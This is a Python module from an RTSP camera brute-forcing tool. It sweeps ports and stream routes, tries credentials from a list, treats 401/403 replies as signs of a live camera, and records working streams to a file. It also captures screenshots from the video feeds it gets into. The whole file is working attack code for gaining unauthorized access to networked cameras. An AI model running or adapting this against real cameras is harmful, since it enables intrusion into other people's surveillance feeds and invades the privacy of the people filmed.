import logging
from pathlib import Path
from typing import List
import re

import av

from rtspbrute.modules.cli.output import console
from rtspbrute.modules.rtsp import RTSPClient, Status
from rtspbrute.modules.utils import escape_chars

ROUTES: List[str]
CREDENTIALS: List[str]
PORTS: List[int]
PICS_FOLDER: Path

DUMMY_ROUTE = "/0x8b6c42"

# Only 200 confirms a route is correct.  401/403 just means the camera is
# reachable and requires auth — it does NOT confirm the route because many
# cameras (e.g. Tapo) return 401 for *every* route, valid or not.
ROUTE_OK_CODES = [
    "RTSP/1.0 200",
    "RTSP/2.0 200",
]
# 401/403 from any route still means "camera is alive, needs auth" — we pass
# the target to credential bruting with a placeholder route.
ROUTE_AUTH_CODES = [
    "RTSP/1.0 401",
    "RTSP/1.0 403",
    "RTSP/2.0 401",
    "RTSP/2.0 403",
]
CREDENTIALS_OK_CODES = ["RTSP/1.0 200", "RTSP/1.0 404", "RTSP/2.0 200", "RTSP/2.0 404"]

logger = logging.getLogger()
logger_is_enabled = logger.isEnabledFor(logging.DEBUG)


def _check_status(target: RTSPClient, code: str) -> bool:
    """Check if the RTSP status line contains the given code (e.g. '200', '401').
    Only checks the first line to avoid false positives from nonces, dates, etc."""
    status_line = target.status_line
    return code in status_line


def attack(target: RTSPClient, port=None, route=None, credentials=None):
    if port is None:
        port = target.port
    if route is None:
        route = target.route
    if credentials is None:
        credentials = target.credentials

    # Create socket connection.
    connected = target.connect(port)
    if not connected:
        if logger_is_enabled:
            exc_info = (
                target.last_error if target.status is Status.UNIDENTIFIED else None
            )
            logger.debug(f"Failed to connect {target}:", exc_info=exc_info)
        return False

    # Try to authorize: create describe packet and send it.
    authorized = target.authorize(port, route, credentials)
    if logger_is_enabled:
        request = "\n\t".join(target.packet.split("\r\n")).rstrip()
        if target.data:
            response = "\n\t".join(target.data.split("\r\n")).rstrip()
        else:
            response = ""
        logger.debug(f"\nSent:\n\t{request}\nReceived:\n\t{response}")
    if not authorized:
        if logger_is_enabled:
            attack_url = RTSPClient.get_rtsp_url(target.ip, port, credentials, route)
            exc_info = (
                target.last_error if target.status is Status.UNIDENTIFIED else None
            )
            logger.debug(f"Failed to authorize {attack_url}", exc_info=exc_info)
        return False

    return True


def _reset_connection(target: RTSPClient):
    """Close the socket and reset status so the next attack() opens a fresh connection."""
    try:
        if target.socket:
            target.socket.close()
    except Exception:
        pass
    target.status = Status.NONE
    target.data = ""


def attack_route(target: RTSPClient):
    # If the stream responds with 200 to a dummy route it means it doesn't
    # require a route at all – skip bruteforcing.
    #
    # Cameras that require authentication respond 401/403 to ANY route
    # (including the dummy).  We must NOT treat that as "route irrelevant"
    # because the actual route still matters for the stream to work.
    DUMMY_OK_CODES = ["RTSP/1.0 200", "RTSP/2.0 200"]

    # Track whether we've seen at least one 401/403, which means the camera
    # is alive and needs auth even though we can't confirm a route yet.
    saw_auth_required = False

    for port in PORTS:
        ok = attack(target, port=port, route=DUMMY_ROUTE)
        if ok and any(code in target.data for code in DUMMY_OK_CODES):
            target.port = port
            target.routes.append("/")
            return target

        # Close the socket used for the dummy probe so route bruteforcing
        # starts with a fresh TCP connection (many cameras close their end
        # after the first RTSP exchange, leaving a stale socket).
        _reset_connection(target)

        # Bruteforce the routes.
        for route in ROUTES:
            ok = attack(target, port=port, route=route)
            if not ok:
                # Connection failed – reset and try the next route instead of
                # aborting entirely (transient or per-request close by camera).
                _reset_connection(target)
                continue
            if any(code in target.data for code in ROUTE_OK_CODES):
                # 200 — confirmed working route (no auth needed or already authed).
                target.port = port
                target.routes.append(route)
                return target
            if any(code in target.data for code in ROUTE_AUTH_CODES):
                # 401/403 — camera is alive and needs auth.  We can't tell if
                # this specific route is correct so just note the port and keep
                # going.  We'll resolve the real route during credential bruting.
                saw_auth_required = True
                target.port = port
            # Camera responded but route wasn't accepted – reset for next try.
            _reset_connection(target)

    # No route returned 200, but if we saw auth-required responses the camera
    # is alive.  Pass it through to credential bruting with a placeholder route
    # so _find_working_route() can sweep once we have valid creds.
    if saw_auth_required:
        if not target.routes:
            target.routes.append(ROUTES[0] if ROUTES else "/")
        if logger_is_enabled:
            logger.debug(
                f"No 200-confirmed route for {target.ip}:{target.port}, "
                f"but got 401/403 — passing to credential brute with placeholder route"
            )
        return target


def _find_working_route(target: RTSPClient, credentials: str):
    """With known-good credentials, sweep ROUTES to find one that returns 200."""
    for route in ROUTES:
        _reset_connection(target)
        ok = attack(target, route=route, credentials=credentials)
        if ok and _check_status(target, "200"):
            target.routes = [route]
            if logger_is_enabled:
                logger.debug(f"Found working route {route} for {credentials}")
            return True
    return False


def attack_credentials(target: RTSPClient):
    def _log_working_stream():
        console.print("Working stream at", target)
        
        # Save target to a file
        with open('targets.txt', 'a') as f:
            f.write(str(target) + '\n')
        
        if logger_is_enabled:
            logger.debug(
                f"Working stream at {target} with {target.auth_method.name} auth"
            )

    if target.is_authorized:
        _log_working_stream()
        return target

    # If stream responds positively to no credentials, it means
    # it doesn't require them and the attack can be skipped.
    ok = attack(target, credentials=":")
    if ok and any(code in target.data for code in CREDENTIALS_OK_CODES):
        _log_working_stream()
        return target

    # Reset before the credential loop so we start fresh.
    _reset_connection(target)

    # Bruteforce the credentials.
    # authorize() now handles the Digest two-step internally, so when we
    # get a response it already reflects the authenticated result.
    for cred in CREDENTIALS:
        _reset_connection(target)
        ok = attack(target, credentials=cred)
        if not ok:
            continue
        if _check_status(target, "200"):
            # Correct credentials AND correct route.
            target.credentials = cred
            _log_working_stream()
            return target
        if _check_status(target, "404"):
            # Credentials are valid but the route is wrong.
            target.credentials = cred
            if _find_working_route(target, cred):
                _log_working_stream()
                return target
            # Couldn't find a 200-route but creds are confirmed.
            _log_working_stream()
            return target
        # 401 = wrong credentials [Digest auth was already attempted inside authorize()], move on to the next credential.


def _is_video_stream(stream):
    return (
            stream.profile is not None
            and stream.start_time is not None
            and stream.codec_context.format is not None
    )


def get_screenshot(rtsp_url: str):
    try:
        with av.open(
                rtsp_url,
                timeout=30.0,
        ) as container:
            stream = container.streams.video[0]
            if _is_video_stream(stream):
                file_name = escape_chars(f"{rtsp_url.lstrip('rtsp://')}.jpg")
                file_path = PICS_FOLDER / file_name
                stream.thread_type = "AUTO"
                for frame in container.decode(video=0):
                    frame.to_image().save(file_path)
                    break
                console.print(
                    f"[bold]Captured screenshot for",
                    f"[underline cyan]{rtsp_url}",
                )
                if logger_is_enabled:
                    logger.debug(f"Captured screenshot for {rtsp_url}")
                return file_path

    except Exception as e:
        pass
        # use a regular expression to match the error message "Server returned 401 Unauthorized"
        #match = re.search("Server returned 401 Unauthorized", str(e))
        #if match:
        #    # extract the IP address from the rtsp_url string using a regular expression
        #    ip_match = re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", rtsp_url)
        #    ip_address = ip_match.group()
        #    # print the error message
        #    console.print(
        #        f"[bold]Screenshot failed, but saved IP to file for",
        #        f"[underline red]{rtsp_url}: {repr(e)}",
        #    )
        #    # save the IP address to an existing file, creates file if it doesn't exist
        #    with open("unauthorized_ips.txt", "a") as f:
        #        f.write(ip_address + "\n")
